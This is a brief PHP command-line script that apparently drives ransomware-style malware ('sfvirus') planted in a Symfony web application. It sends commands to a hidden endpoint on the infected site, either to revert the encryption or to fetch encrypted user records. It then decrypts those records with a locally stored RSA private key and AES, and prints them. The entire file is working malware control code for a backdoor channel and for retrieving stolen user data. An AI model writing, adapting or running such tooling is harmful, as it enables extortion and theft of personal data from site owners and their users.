#!/usr/bin/env php
<?php

$url = 'http://sfvirus.local/app_dev.php/?cryptosymfony_action=';
$action = $argv[1];

switch ($action) {
    case 'revert':
        file_get_contents($url . 'revert');

        break;
    case 'get_users':
        $contents = json_decode(file_get_contents($url . 'get_users'));

        // get the private key
        $privKey = file_get_contents(__DIR__ . '/keys/' . $contents->key . '.key');

        // get users
        foreach ($contents->users as $user) {

            $userRaw = base64_decode($user);
            $passwordLen = (int)substr($userRaw, 1, 3);
            $password = substr($userRaw, 5, $passwordLen);
            $data = substr($userRaw, 5 + $passwordLen);

            openssl_private_decrypt($password, $passwordDecrypted, $privKey);

            $decrypted = openssl_decrypt($data, 'aes128', $passwordDecrypted, 0, '1234567812345678');

            echo $decrypted . PHP_EOL;
        }

        break;
}

